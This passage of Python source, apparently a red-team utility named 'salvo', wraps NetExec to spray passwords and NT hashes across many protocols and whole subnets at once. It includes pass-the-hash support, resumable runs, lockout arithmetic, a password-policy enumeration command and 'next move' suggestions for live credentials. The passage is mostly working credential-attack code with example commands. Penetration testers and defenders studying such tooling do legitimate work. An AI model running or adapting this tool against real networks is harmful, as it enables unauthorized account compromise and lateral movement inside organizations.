        out.append("  {:<6} as {:<16} {}".format(proto, user, note))
        out.append("         {}".format(", ".join(sorted(ips))))
    return out


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        prog="salvo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Spray one or many credentials across every nxc protocol at once.",
        epilog="""
examples
--------
  # one password, default protocol set, whole subnet
  salvo 192.168.100.0/24 -u jdoe -p 'Password123!' -d corp.local

  # a local admin hash recovered from a SAM dump, against three known hosts
  salvo 192.168.100.10 192.168.100.25 192.168.100.26 \\
      -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

  # every credential you have collected so far, against every host, both auth modes
  salvo targets.txt -C creds.txt -d corp.local --both-auth --markdown

  # resumable: if the VM hangs, re-run the IDENTICAL command. Answered jobs are
  # skipped, their results merged back in, and no account takes a second logon.
  salvo 192.168.100.0/24 -C creds.txt -d corp.local --state .salvo.state

  # start that scope over from scratch
  salvo --state .salvo.state --forget

  # show me the nxc commands, run nothing
  salvo 192.168.100.0/24 -u jdoe -p 'Password123!' -d corp.local --dry-run

idempotence
-----------
  Same arguments in, same bytes out - results are sorted, never printed in
  thread order. Duplicate credentials and targets are dropped before they cost
  you a logon. Logs and JSON are overwritten, not appended. With --state, a
  repeat run is a no-op; changing the credentials, protocols or target list
  changes the job signature, so a moved scope is never silently skipped.

creds.txt format
----------------
  jdoe:Password123!
  Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
  CORP\\svc_sql:Winter2026!
""",
    )

    ap.add_argument("targets", nargs="+",
                    help="IPs, ranges, CIDRs, hostnames, or a file of them - anything nxc accepts")

    g = ap.add_argument_group("credentials")
    g.add_argument("-u", "--user", help="single username")
    g.add_argument("-p", "--password", help="single password")
    g.add_argument("-H", "--hash", dest="nthash", help="single NT hash (pass-the-hash)")
    g.add_argument("-C", "--creds", help="file of user:secret lines - hashes auto-detected")
    g.add_argument("-d", "--domain", help="domain for domain authentication")
    g.add_argument("--local-auth", action="store_true", help="authenticate as a LOCAL account")
    g.add_argument("--both-auth", action="store_true",
                   help="run every credential twice: once domain, once --local-auth")

    g = ap.add_argument_group("scope")
    g.add_argument("-P", "--protocols", default=",".join(DEFAULT_PW_PROTOCOLS),
                   help="comma list, or 'all'. default: " + ",".join(DEFAULT_PW_PROTOCOLS))
    g.add_argument("--parallel", type=int, default=6,
                   help="concurrent nxc processes (default 6)")
    g.add_argument("--nxc-threads", type=int, default=25,
                   help="nxc's own -t per process (default 25, drop to 5 over a slow tunnel)")
    g.add_argument("--nxc-timeout", type=int, default=15,
                   help="nxc --timeout seconds (default 15)")
    g.add_argument("--jitter", help="nxc --jitter value, e.g. 2 or 1-3")
    g.add_argument("--slow", action="store_true",
                   help="tunnel preset: parallel 3, nxc-threads 5, timeout 30")

    g = ap.add_argument_group("output")
    g.add_argument("--markdown", action="store_true", help="emit the matrix as an Obsidian table")
    g.add_argument("--json", dest="jsonout", help="write all results to this JSON file")
    g.add_argument("--logdir", help="save raw nxc output per job into this directory")
    g.add_argument("--quiet", dest="stream", action="store_false", default=True,
                   help="suppress live lines, print only the matrix")
    g.add_argument("--dry-run", action="store_true", help="print the nxc commands and exit")

    g = ap.add_argument_group("safety")
    g.add_argument("--no-lockout-guard", action="store_true",
                   help="do NOT abort the run when a lockout is seen")
    g.add_argument("--nxc-bin", default="nxc", help="path to nxc (default: nxc on PATH)")

    g = ap.add_argument_group("resume")
    g.add_argument("--state", metavar="FILE",
                   help="resume file. Jobs already answered here are skipped, and "
                        "their results merged into this run's matrix. Safe to "
                        "re-run the identical command after a crash or Ctrl-C.")
    g.add_argument("--no-resume", action="store_true",
                   help="with --state: ignore what is in the file, but still write to it")
    g.add_argument("--forget", action="store_true",
                   help="delete the --state file and exit")

    args = ap.parse_args()

    if args.forget:
        if not args.state:
            sys.exit("[!] --forget needs --state FILE")
        for p in (args.state, args.state + ".tmp"):
            if os.path.isfile(p):
                os.remove(p)
                print("[*] removed " + p)
        return

    if args.slow:
        args.parallel, args.nxc_threads, args.nxc_timeout = 3, 5, 30

    if not args.dry_run and not shutil.which(args.nxc_bin):
        sys.exit("[!] '{}' not found on PATH. Install NetExec or pass --nxc-bin.".format(args.nxc_bin))

    # targets: drop exact repeats, keep the order given
    targets = []
    for t in args.targets:
        if t not in targets:
            targets.append(t)
    if len(targets) != len(args.targets):
        print("[*] dropped {} duplicate target(s)".format(len(args.targets) - len(targets)))
    args.targets = targets

    # ---- build credential list ------------------------------------------
    raw_creds = []
    if args.creds:
        if not os.path.isfile(args.creds):
            sys.exit("[!] no such creds file: " + args.creds)
        raw_creds += parse_cred_file(args.creds)
    if args.user:
        if args.password:
            raw_creds.append((args.domain, args.user, args.password, False))
        elif args.nthash:
            raw_creds.append((args.domain, args.user, args.nthash, True))
        else:
            sys.exit("[!] -u needs -p or -H")
    if not raw_creds:
        sys.exit("[!] no credentials given. Use -u/-p, -u/-H, or -C.")

    creds = []
    seen_creds = set()
    dupes = 0
    for dom, user, secret, is_hash in raw_creds:
        dom = dom or args.domain
        if args.both_auth:
            variants = [(dom, False), (None, True)]
        else:
            variants = [(None if args.local_auth else dom, args.local_auth)]
        for vdom, vlocal in variants:
            c = Cred(user, secret, is_hash, vdom, vlocal, idx=len(creds))
            if c.key in seen_creds:
                dupes += 1
                continue
            seen_creds.add(c.key)
            creds.append(c)
    if dupes:
        print("[*] dropped {} duplicate credential(s) - each one would have been "
              "another logon against the lockout counter".format(dupes))

    # ---- protocols -------------------------------------------------------
    if args.protocols.strip().lower() == "all":
        protocols = list(ALL_PROTOCOLS)
    else:
        protocols = [p.strip().lower() for p in args.protocols.split(",") if p.strip()]
    bad = [p for p in protocols if p not in ALL_PROTOCOLS]
    if bad:
        sys.exit("[!] unknown protocol(s): {}. valid: {}".format(",".join(bad), ",".join(ALL_PROTOCOLS)))

    if any(c.is_hash for c in creds):
        skipped = [p for p in protocols if p not in HASH_CAPABLE]
        if skipped:
            print("[*] hash credentials cannot pass-the-hash over: {} - skipping those jobs"
                  .format(", ".join(skipped)))
    if "vnc" in protocols:
        print("[*] note: nxc vnc authenticates with a password only, the username is ignored")

    if args.logdir:
        os.makedirs(args.logdir, exist_ok=True)

    # ---- resume store ----------------------------------------------------
    state = None
    if args.state:
        state = State(args.state)
        n = state.load()
        if args.no_resume:
            # Re-run everything, but keep what is already on disk. Wiping the
            # file here would throw away answers from an earlier scope.
            state.ignore = True
            print("[*] --no-resume: re-running all jobs; {} existing record(s) kept"
                  .format(n))
        elif n:
            print("[*] resume file has {} completed job(s): {}".format(n, args.state))

    # ---- dry run ---------------------------------------------------------
    if args.dry_run:
        runner = Runner(args, state)
        jobs = runner.plan(creds, protocols, args.targets)
        print("\n[commands that would run - {} of them{}]\n".format(
            len(jobs), ", {} skipped".format(runner.skipped) if runner.skipped else ""))
        for cred, proto, tgts, _sig in jobs:
            print("  " + " ".join(quote(c) for c in runner.build_cmd(cred, proto, tgts)))
        print("")
        return

    # ---- plan ------------------------------------------------------------
    runner = Runner(args, state)
    jobs = runner.plan(creds, protocols, args.targets)

    # ---- lockout arithmetic ---------------------------------------------
    # Every protocol against every host is a separate authentication attempt,
    # and a DOMAIN account's lockout counter lives on the DC regardless of
    # which member server you authenticated against. So the bill is
    # protocols x hosts, not protocols. Counted on the jobs that will ACTUALLY
    # run, so a resumed run does not warn about attempts it is not making.
    LITERAL_IP = re.compile(r"^[0-9]{1,3}(?:\.[0-9]{1,3}){3}$")
    exact_hosts = (len(args.targets)
                   if all(LITERAL_IP.match(t) for t in args.targets) else None)

    protos_per_user = {}
    for cred, proto, _t, _s in jobs:
        protos_per_user[cred.user] = protos_per_user.get(cred.user, 0) + 1
    if protos_per_user:
        worst_user, n_proto = max(sorted(protos_per_user.items()), key=lambda kv: kv[1])
        if exact_hosts is not None:
            total = n_proto * exact_hosts
            detail = "{} logons ({} protocol-jobs x {} hosts)".format(
                total, n_proto, exact_hosts)
        else:
            total = n_proto
            detail = "{} logons PER HOST, and the target spec is a range or file " \
                     "so the host count is unknown".format(n_proto)
        if total > 3:
            print("[!] LOCKOUT MATH: '{}' will take up to {}.".format(worst_user, detail))
            print("    A domain account's counter is on the DC, so every host counts.")
            print("    Default AD lockout threshold is often 5. Check it first:")
            print("        nxc smb <DC_IP> -u '' -p '' --pass-pol")
            print("    Narrow with -P smb,winrm if that number is too close.\n")

    # ---- go --------------------------------------------------------------
    runner.execute(jobs)
    runner.finalize()

    print(render_matrix(runner.hits, protocols, markdown=args.markdown))

    # what the run actually cost, as opposed to the worst case warned about
    real = runner.attempts_made()
    if real:
        print("AUTHENTICATION ATTEMPTS ACTUALLY MADE (a '-' never reached auth):")
        for user, n in sorted(real.items()):
            print("  {:<24} {}".format(user, n))
        print("")

    incon = inconclusive_report(runner.hits)
    if incon:
        print("NOT A VERDICT - these did not fail, they were blocked or unreadable:")
        print("\n".join(incon))
        print("  A credential in this list is still live. Take it to another protocol.\n")

    moves = next_moves(runner.hits)
    if moves:
        print("NEXT:")
        for m in moves:
            print(m)
        print("")

    for note in runner.advisories():
        print("[!] " + note)
    if runner.advisories():
        print("")

    if args.jsonout:
        proto_rank = {p: i for i, p in enumerate(protocols)}
        results = sorted(
            (h.as_dict() for h in runner.hits),
            key=lambda r: (r["user"], r["secret"], bool(r["local_auth"]),
                           proto_rank.get(r["protocol"], 99),
                           ip_sort_key(r["ip"]), r["raw"]),
        )
        write_json_atomic(args.jsonout, {
            "generated": datetime.now().isoformat(timespec="seconds"),
            "targets": args.targets,
            "protocols": protocols,
            "results": results,
        })
        print("[*] json written to " + args.jsonout)

    if state:
        state.save()
        print("[*] resume state: {} ({} job(s) recorded)".format(args.state, len(state.jobs)))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\n[!] interrupted")
